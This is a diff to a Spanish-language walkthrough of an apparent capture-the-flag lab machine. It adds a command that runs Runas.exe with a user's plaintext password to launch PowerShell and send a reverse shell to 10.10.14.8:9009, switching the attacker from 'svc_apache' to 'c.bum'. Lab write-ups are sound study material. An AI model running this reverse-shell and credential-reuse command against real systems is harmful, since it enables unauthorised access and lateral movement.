@@ -212,7 +212,9 @@ Dado que el firewall cierra el puerto 8000, no podemos acceder a este sitio exte
 primero que nada vamos a cambiarnos de usuario ya que actualmente somos el usuario `svc_apache` pero recordemos que tenemos las credenciales del usuario `c.bum` para ello lo primero que debemos hacer es descargar el binario `Runas.exe` y subirlo a la maquina. una vez ua tengamos este binario solo debemos ejecutarlo usando el siguiente comando:
 
 ```python
-
+.\runas.exe c.bum Tikkycoll_431012284 powershell.exe -r 10.10.14.8:9009
 ```
 
+de esta manera obtenemos una shell como el usuario `c.bum`
 ![[Pasted image 20240810152657.png]]
+
